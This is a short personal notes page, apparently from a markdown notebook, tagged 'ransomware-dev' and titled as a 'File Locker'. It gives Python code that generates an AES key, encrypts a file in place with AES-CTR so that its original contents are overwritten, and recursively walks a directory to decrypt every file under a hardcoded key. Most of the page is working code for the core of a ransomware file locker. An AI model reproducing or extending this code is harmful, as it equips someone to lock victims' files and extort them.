---
tags: [ "python", "encryption", "decryption", "aes-ctr", "ransomware-dev" ]
aliases: [ "File Locker", "Directory Decrypter" ]
created: 2025-12-21
---

# 🛡️ AES-CTR: File & Directory Operations

> [!tip] In-Place Modification
> These scripts use `f.seek(-len(plaintext), 1)` to move the file pointer back and overwrite the data. This is extremely efficient because it doesn't require creating a second "encrypted" copy of the file.

## 1. Generating the Session Key
Before running the scripts, you need a 16-byte key.

```python title:Key_Gen.py
from Crypto import Random
key50 = Random.new().read(16)
print(key50)
```

## 2. Single File Encrypter

This script targets one specific file and locks it using `cipher.encrypt`.

- Open for Reading + Writing in Binary mode
- Go back to start of chunk
- Overwrite with cipher
- Get next chunk
- Usage

```python
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

def encrypt_aes_ctr(key, fullpath):
    counter = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)

    with open(fullpath, 'r+b') as f:
        plaintext = f.read(16)
        while plaintext:
            f.seek(-len(plaintext), 1)
            f.write(cipher.encrypt(plaintext))
            plaintext = f.read(16)

key = b'\xe8\xa2\x90I\xdc\xd0\xe0\xb7A\x8f@\xcc\x97\xbe \xc4'
encrypt_aes_ctr(key, r"D:\CRypt useR.txt")
```

## 3. Recursive Directory Decrypter

This script walks through a folder and unlocks every file using `cipher.decrypt`.

- Reverse the encryption
- Configuration
- Walk through all subfolders in the target directory

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

def decrypt_aes_ctr(key, fullpath):
    counter = Counter.new(128)
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)

    with open(fullpath, 'r+b') as f:
        ciphertext = f.read(16)
        while ciphertext:
            f.seek(-len(ciphertext), 1)
            f.write(cipher.decrypt(ciphertext))
            ciphertext = f.read(16)

key = b'\xe8\xa2\x90I\xdc\xd0\xe0\xb7A\x8f@\xcc\x97\xbe \xc4'

for dir, subdirs, files in os.walk(r"D:\test"):
    for file in files:
        fullpath = os.path.join(dir, file)
        print("Decrypting file:", fullpath)
        decrypt_aes_ctr(key, fullpath)
```
